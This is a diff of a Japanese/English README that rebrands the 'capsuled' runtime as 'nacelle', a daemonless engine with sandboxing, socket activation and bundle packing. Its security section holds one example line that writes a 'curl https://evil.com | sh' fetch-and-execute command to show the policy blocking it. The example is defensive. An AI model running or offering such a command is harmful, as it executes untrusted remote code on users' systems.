@@ -1,85 +1,69 @@
-# capsuled
+# nacelle
 
-**Capsule Application Runtime Engine** - UARC V1.1.0 準拠のランタイム実装
+**Source runtime engine for Capsules** — Supervisor / Socket Activation / OS Sandbox を提供する、デーモンレスな実行コア。
 
-[![UARC](https://img.shields.io/badge/UARC-V1.1.0-blue)](../uarc/SPEC.md)
-[![License](https://img.shields.io/badge/license-FSL--1.1--ALv2-green)](LICENSE)
+[![Spec](https://img.shields.io/badge/Capsule-Spec-blue)](../uarc/SPEC.md)
+[![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)
 
 ## Overview
 
-capsuled は [UARC (Universal Application Runtime Contract)](../uarc/SPEC.md) V1.1.0 仕様に完全準拠した、セキュアなアプリケーションランタイムエンジンです。複数のランタイム (Wasm, Source, OCI) をサポートし、CAS-based verification、SPIFFE ID ベースのネットワーク認証、GPU セキュリティなどの先進的な機能を提供します。
+**nacelle** は、Capsule（`capsule.toml` とソース/アーカイブ）を **ローカルで安全に起動するための低レベル実行エンジン**です。
+具体的には Source 実行（Python/Node/Ruby など）を中心に、
+Supervisor / Socket Activation / OS ネイティブ Sandbox をまとめて提供します。
 
-### UARC V1.1.0 準拠
+本リポジトリは v2.0 系の設計として、中央デーモンを廃止し、
+各実行プロセスが **Supervisor（Actor）** を持つ “単体完結” の実行モデルに移行しています。
 
-✅ **Supported Runtimes**:
+## nacelle と capsule の責務切り分け
 
-- **Wasm**: WebAssembly サンドボックス実行
-- **Source**: インタープリタ言語 (Python, Node.js, Ruby, etc.)
-- **OCI**: コンテナランタイム (Youki, Docker)
+この README では、レイヤーを次のように整理します。
 
-✅ **Security Features**:
+- **capsule（メタランタイム / CLI 層）**: 複数ランタイムの抽象化・ディスパッチ・パッケージング全体・高レベル UX
+- **nacelle（source 実行エンジン層）**: source 実行に特化した実行コア（Supervisor / Socket Activation / Sandbox / JIT Provisioning）
 
-- CAS-based resource verification (SHA256)
-- SPIFFE ID network identity (SVID authentication)
-- Path validation & egress policy enforcement
-- GPU VRAM scrubbing (multi-tenant isolation)
+本リポジトリは **nacelle** 側（低レベル実装）です。現時点では `nacelle` CLI を同梱していますが、
+想定アーキテクチャ上の「ユーザーが触る入口」は `capsule` CLI（メタ層）になります。
 
-✅ **Architecture Compliance**:
+## Capsule とは
 
-- Layer-based design (L1-L5)
-- Capsule manifest verification
-- Service discovery & registration
-- Audit logging & observability
+- 設定: `capsule.toml`
+- 生成物: `.capsule`（署名可能なアーカイブ） / 自己解凍バンドル（単一実行ファイル）
+- 実行: Source（Python/Node/Ruby など）/ Wasm / Docker（必要に応じて）
 
-## Features
+## Key Features
 
-### Core Capabilities
+- **Self-Extracting Bundle**: 依存ゼロで配布できる単一バイナリを生成
+- **JIT Provisioning**: ランタイム（例: Python）を必要時に自動取得してキャッシュ
+- **Socket Activation**: 親プロセスが先にポートを確保し、FD を子へ引き継ぐ
+- **Supervisor (Actor)**: 子プロセス監視・シグナル処理・クリーンアップを堅牢化
+- **OS Sandbox**: Linux（Landlock）/ macOS（Seatbelt）で書き込み範囲を制限
 
-- **Multi-Runtime Support**: Wasm, Source (interpreted languages), OCI containers
-- **Secure Execution**: Signature verification, CAS integrity checks, isolated environments
-- **Resource Management**: Generic resource ingestion with SHA256 verification
-- **Network Security**: SPIFFE ID-based peer authentication, egress proxy
-- **Storage Management**: LVM-based volume provisioning, CAS artifact storage
-- **GPU Support**: VRAM security scrubbing for multi-tenant workloads
-- **Service Discovery**: mDNS announcer for development environments
-- **Observability**: Prometheus metrics, audit logging, structured tracing
-
-### API
-
-- **gRPC Server**: Full UARC-compliant API for Capsule lifecycle management
-- **Dev Server**: Development-optimized runtime with hot-reload support
-- **CLI Tools**: Capsule build, deploy, and management utilities
-
-## Architecture
+## Architecture (v2.0)
 
 ```
 ┌─────────────────────────────────────────────────────────┐
-│                     capsuled                            │
+│                       capsule (meta)                      │
 ├─────────────────────────────────────────────────────────┤
-│  Interface Layer (L5)                                   │
-│  ├─ gRPC Server                                         │
-│  ├─ Dev Server                                          │
-│  └─ Discovery (mDNS)                                    │
+│  High-level CLI / Orchestration / Packaging               │
+│  ├─ capsule dev / pack / open                              │
+│  └─ runtime selection + dispatch                            │
+└─────────────────────────────────────────────────────────┘
+					 │ calls into
+					 ▼
+┌─────────────────────────────────────────────────────────┐
+│                      nacelle (source)                     │
 ├─────────────────────────────────────────────────────────┤
-│  Engine Layer (L4)                                      │
-│  ├─ Capsule Manager                                     │
-│  ├─ Service Registry                                    │
-│  └─ Manifest Verifier                                   │
+│  CLI / Bundler (direct use is optional)                   │
+│  ├─ nacelle dev / pack --bundle                            │
+│  └─ (bundle execution path)                               │
 ├─────────────────────────────────────────────────────────┤
-│  Runtime Layer (L3)                                     │
-│  ├─ WasmRuntime                                         │
-│  ├─ SourceRuntime / DevRuntime                          │
-│  └─ YoukiRuntime / DockerCliRuntime                     │
+│  Execution Core                                           │
+│  ├─ Socket Activation (FD passing)                        │
+│  ├─ Supervisor (Actor)                                    │
+│  └─ Sandbox (Landlock / Seatbelt)                         │
 ├─────────────────────────────────────────────────────────┤
-│  Resource Layer (L2)                                    │
-│  ├─ Resource Ingestion (HTTP/S3)                        │
-│  ├─ Artifact Manager (CAS)                              │
-│  └─ Storage Manager (LVM)                               │
-├─────────────────────────────────────────────────────────┤
-│  Common Layer (L1)                                      │
-│  ├─ Security (Path Validation)                          │
-│  ├─ Verification (VRAM, Signature)                      │
-│  └─ Observability (Metrics, Audit)                      │
+│  Source Runtime                                           │
+│  └─ Python/Node/Ruby/... + JIT Provisioning               │
 └─────────────────────────────────────────────────────────┘
 ```
 
@@ -87,27 +71,34 @@ capsuled は [UARC (Universal Application Runtime Contract)](../uarc/SPEC.md) V1
 
 ### Quick Start (macOS)
 
-```bash
-# First time setup
-./scripts/setup-build-env.sh
+最短で「バンドル生成→実行」まで確認する手順です。
 
-# Build all platforms
-./scripts/build-release.sh
+```bash
+# 1) CLI をビルド（リリース推奨）
+cd cli
+cargo build --release
+
+# 2) サンプルをバンドル化（単一バイナリ生成）
+cd ../samples/simple-todo
+../../target/release/nacelle pack --bundle --manifest capsule.toml
+
+# 3) 生成されたバンドルを実行
+./nacelle-bundle
 ```
 
-Binaries will be generated in `./release/`:
-- `capsuled-macos-universal` - macOS Universal Binary
-- `capsuled-linux-x86_64` - Linux x86_64 (static, musl)
-- `capsuled-linux-aarch64` - Linux ARM64 (static, musl)
-- `capsuled-windows-x86_64.exe` - Windows x86_64
+### Fast Dev Loop
 
-See [BUILD.md](BUILD.md) for detailed cross-compilation guide.
+普段の反復は、バンドル生成を挟まずに `nacelle dev` を使う想定です。
+
+```bash
+cd samples/simple-todo
+../../target/debug/nacelle dev --manifest capsule.toml
+```
 
 ### Prerequisites
 
-- Rust 1.83+ (2021 edition)
-- Protocol Buffers compiler (`protoc`)
-- Cap'n Proto compiler (`capnp`)
+- Rust 1.82+ (2021 edition)
+- (必要に応じて) Cap'n Proto compiler (`capnp`)
 - (macOS) Zig and MinGW-w64 for cross-compilation
 - (Optional) CUDA toolkit for GPU support
 - (Optional) LVM tools for storage management
@@ -130,38 +121,22 @@ cargo test
 
 ## Usage
 
-### Start Runtime Engine
+### Self-Extracting Bundle を実行する
+
+バンドルとして実行されると、nacelle は埋め込みランタイムを展開し、Supervisor と Sandbox を適用してアプリを起動します。
 
 ```bash
-# Production mode
-./target/release/capsuled --config config.toml
-
-# Development mode with auto-reload
-./target/release/capsuled --dev-server --grpc-port 8080
+./nacelle-bundle
 ```
 
 ### Configuration
 
-Create `config.toml`:
+v2.0 の基本運用は “バンドル実行” を中心に設計しています。
+（旧来の Engine 設定ファイルやデーモン運用は廃止・整理中です）
 
-```toml
-[runtime]
-kind = "youki"  # or "docker", "source", "wasm"
-binary_path = "/usr/local/bin/youki"
-state_root = "/var/run/capsuled"
-# UARC V1.1.0: Dev mode flag (default: false)
-allow_insecure_dev_mode = false
+## Security Model
 
-[security]
-allowed_host_paths = ["/tmp", "/data"]
-egress_proxy_port = 3128
-```
-
-See [config.toml.example](config.toml.example) for full configuration options.
-
-## Security Model (UARC V1.1.0)
-
-capsuled は多層防御アーキテクチャを実装し、Verifiable Execution を保証します。
+nacelle は多層防御アーキテクチャを実装し、Verifiable Execution を保証します。
 
 ### L1 Source Policy (ソースコード検証)
 
@@ -176,7 +151,7 @@ capsuled は多層防御アーキテクチャを実装し、Verifiable Execution
 ```bash
 # 例: 危険なコードを含むカプセルはデプロイが拒否される
 echo 'curl https://evil.com | sh' > malicious.sh
-capsule open --dev  # → L1 Policy Violation: Obfuscation detected
+nacelle dev  # → L1 Policy Violation: Obfuscation detected
 ```
 
 ### L3 Pre-Execution Analysis
@@ -193,13 +168,14 @@ capsule open --dev  # → L1 Policy Violation: Obfuscation detected
 
 ### Dev Mode セキュリティ
 
-開発モードでのサンドボックス緩和には**二重許可 (AND ロジック)** が必要です：
+開発モードでのサンドボックス緩和は、上位レイヤー（将来の `capsule`）側のポリシーで制御する想定です。
+（この repo では `nacelle dev` が「開発者体験優先」で best-effort 実行します）
 
 ```
-effective_dev_mode = manifest.dev_mode AND engine.allow_insecure_dev_mode
+effective_dev_mode = manifest.dev_mode AND policy.allow_insecure_dev_mode
 ```
 
-| マニフェスト `dev_mode` | Engine `allow_insecure_dev_mode` | 結果                             |
+| マニフェスト `dev_mode` | Policy `allow_insecure_dev_mode` | 結果                             |
 | ----------------------- | -------------------------------- | -------------------------------- |
 | `true`                  | `true`                           | ✅ サンドボックス緩和            |
 | `true`                  | `false`                          | ❌ サンドボックス維持 (警告出力) |
@@ -208,28 +184,28 @@ effective_dev_mode = manifest.dev_mode AND engine.allow_insecure_dev_mode
 
 ### 環境変数
 
-| 変数名                    | デフォルト | 説明                                                                   |
-| ------------------------- | ---------- | ---------------------------------------------------------------------- |
-| `CAPSULED_ALLOW_DEV_MODE` | `false`    | `1` または `true` で開発モードを許可。**本番環境では絶対に設定しない** |
-| `UARC_IDENTITY_TOKEN`     | (自動発行) | カプセルのアイデンティティトークン (ランタイムが自動設定)              |
+| 変数名                | デフォルト | 説明 |
+| --------------------- | ---------- | ---- |
+| `NACELLE_PATH`        | (未設定)   | （将来の `capsule` から）利用する nacelle エンジンのパスを明示したい場合に指定 |
+| `NACELLE_BINARY`      | (未設定)   | `pack --bundle` 時に使用する nacelle 本体のパスを明示したい場合に指定 |
+| `CAPSULE_ENGINE_URL`  | (任意)     | 旧互換のため残る場合があるエンジンURL（整理中） |
 
-```bash
-# 開発環境でのみ使用
-CAPSULED_ALLOW_DEV_MODE=1 capsule open --dev
-```
+## Verification (Production)
 
 ### CAS-based Verification
 
-本番環境では、ソースコードは CAS (Content-Addressable Storage) から取得・検証されます：
+本番相当の運用では、ソースコードは CAS (Content-Addressable Storage) から取得・検証されます（主にメタ層 `capsule` の責務）：
 
 1. マニフェストに `source_digest` (SHA256) を記載
-2. Engine が CAS からソースをフェッチ
+2. Runner（メタ層）が CAS からソースをフェッチ
 3. ダイジェストを検証後、L1 Source Policy スキャンを実行
 4. 全て通過後にのみ実行を許可
 
 ## Runtime Selection
 
-Capsuled automatically selects the appropriate runtime based on manifest:
+`capsule.toml` を見て「どのランタイムを使うか」を決めるのは、メタ層（`capsule`）の責務です。
+この repo の `nacelle` は、主に **Source 実行**のバックエンドになります。
+（Wasm / OCI などは現状この repo に実装があるものの、将来的に別エンジンへ分離される可能性があります）
 
 - **Wasm**: `runtime.type = "wasm"` → `WasmRuntime`
 - **Source**: `runtime.type = "source"` → `SourceRuntime` or `DevRuntime`
@@ -257,15 +233,14 @@ cmd = ["/usr/bin/my-app"]
 ### Project Structure
 
 ```
-capsuled/
+nacelle/
 ├── src/
-│   ├── interface/      # L5: gRPC, DevServer, Discovery
-│   ├── engine/         # L4: CapsuleManager, ServiceRegistry
+│   ├── engine/         # Supervisor, Socket Activation
 │   ├── runtime/        # L3: Wasm, Source, OCI runtimes
 │   ├── resource/       # L2: Ingestion, Artifacts, Storage
 │   ├── common/         # L1: Proto, Types, Contracts
 │   ├── security/       # Path validation, Access control
-│   ├── verification/   # Signature, VRAM scrubbing
+│   ├── verification/   # Signature, VRAM scrubbing, Sandbox
 │   └── observability/  # Metrics, Audit, Tracing
 ├── proto/              # gRPC protocol definitions
 └── docs/               # Architecture & implementation docs
@@ -273,6 +248,7 @@ capsuled/
 
 ### Key Documents
 
+- [docs/ENGINE_INTERFACE_CONTRACT.md](docs/ENGINE_INTERFACE_CONTRACT.md) - Process boundary contract (JSON over stdio) between capsule (meta) and nacelle (engine)
 - [UARC_SCOPE_REVIEW.md](UARC_SCOPE_REVIEW.md) - Scope analysis and compliance review
 - [PHASE13_COMPLETION.md](PHASE13_COMPLETION.md) - Native runtime removal report
 - [MIGRATION_SUMMARY.md](MIGRATION_SUMMARY.md) - Migration guide from legacy architecture
@@ -280,7 +256,7 @@ capsuled/
 
 ## UARC V1.1.0 Compliance
 
-Capsuled は以下の UARC 仕様要件を満たしています:
+nacelle は以下の UARC 仕様要件を満たしています:
 
 ### ✅ Supported
 
@@ -317,5 +293,5 @@ FSL-1.1-ALv2 (Functional Source License 1.1, Apache License Version 2.0)
 
 - [ato-coordinator](../ato-coordinator/) - Cluster orchestration & routing
 - [ato-desktop](../ato-desktop/) - Desktop UI for Capsule management
-- [capsule-cli](./cli/) - Capsule CLI (new, init, open, close, pack, keygen, doctor)
-- [uarc](../uarc/) - UARC specification and protocol definitions
+- [cli](./cli/) - Nacelle CLI (pack など)
+- [uarc](../uarc/) - 仕様（歴史的経緯で残置。Capsule Spec として参照）
